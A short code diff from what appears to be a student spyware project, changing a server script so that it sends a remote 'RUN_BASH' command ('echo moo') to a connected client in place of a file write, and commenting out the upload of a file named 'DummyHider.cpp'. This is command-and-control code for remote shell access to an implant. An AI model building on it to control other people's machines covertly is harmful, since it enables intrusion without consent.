@@ -14,10 +14,10 @@ FunCode: dict[str, int] = {
 def main():
     serv = Server()
     with serv.serverConnection(HOST, PORT) as conn:
-        serv.sendCommand(conn, FunCode["WRITE_FILE"], "1234.out")
-        serv.sendFile(conn, "/home/avners/Arazim-Projects-2024---spyware/src/ServerSpy/a.out")
-        ans = serv.recvCommand()
+        serv.sendCommand(conn, FunCode["RUN_BASH"], "echo moo")
+        ans = serv.recvCommand(conn)
         print(f"{ans = }")
+        # serv.sendFile(conn, "/home/avner/Arazim-Projects-2024---spyware/src/ServerSpy/DummyHider.cpp")
 
 
 
